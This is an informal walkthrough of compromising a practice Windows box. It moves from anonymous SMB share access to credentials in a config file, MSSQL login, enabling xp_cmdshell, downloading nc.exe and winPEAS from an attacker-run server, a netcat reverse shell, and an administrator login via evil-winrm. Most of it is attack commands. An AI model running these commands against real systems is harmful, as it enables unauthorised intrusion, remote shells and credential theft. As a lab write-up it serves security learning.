this box had multiple file shares:

first we could anonymously login on 1 the samba server:

and we had a access to the backup
smbclient -L={boxip}
smbclient -L={boxip}/backups

we could find a user and password in the `prod.dtsConfig` file

with these we could login to the mssql database
using impacket-mssqlclient

`impacket-mssqlclient {workgroup}/{user}:{password}@{boxip} -windows-auth`

using this impacket mssqlclient we get a shell
but we cant run commands like `whoami` or `ipconfig,
thus we need ot enable this:

`EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1'
RECONFIGURE
xp_cmdshell "ping {hack_box_ip}"`

although this allows us to run commands, this is not amazing, thus we need to get a more persistent shell:
first we setup 2 listeners on our hack_box:
`python3 -m http.server`
`nc -lvnp 9001`

then we download nc.exe and winpeas.exe to the box:
`impacket-mssqlclient {workgroup}/{user}:{password}@{boxip} -windows-auth
xp_cmdshell "powershell.exe wget {hack_box_ip}:8000/tools/nc.exe -OutFile c:\\Users\Public\\nc.exe"
xp_cmdshell "powershell.exe wget {hack_box_ip}:8000/tools/winpeas.exe -OutFile c:\\Users\Public\\winpeas.exe"
xp_cmdshell "c:\\Users\Public\\nc.exe {hack_box_ip} 9001 -e cmd"`

in the reverse shell:
we can use winpeas, 
wich findes the file ConsoleHost_history.txt contains the password for the administrator login

using evil-winrm we can login to the box:
`evil-winrm -u {user} -p '{pass}' -i {boxip}`